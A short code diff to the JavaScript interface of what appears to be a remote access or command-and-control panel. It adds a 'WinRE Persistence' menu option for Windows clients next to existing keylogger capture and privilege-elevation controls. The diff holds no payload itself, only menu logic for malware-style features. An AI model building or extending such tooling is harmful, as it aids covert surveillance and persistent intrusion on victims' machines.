@@ -196,6 +196,13 @@ function applyMenuSupportRules(clientId) {
     "Keylogger capture is only fully supported on Windows clients.",
   );
 
+  const winreBtn = menu.querySelector('[data-open="winre"]');
+  if (winreBtn) {
+    setAvailability(winreBtn, isWindows, "WinRE Persistence is only supported on Windows clients.");
+    const label = winreBtn.querySelector("span");
+    if (label) label.style.textDecoration = isWindows ? "" : "line-through";
+  }
+
   const elevateBtn = menu.querySelector('[data-action="elevate"]');
   if (elevateBtn) {
     elevateBtn.style.display = platform === "mac" ? "" : "none";
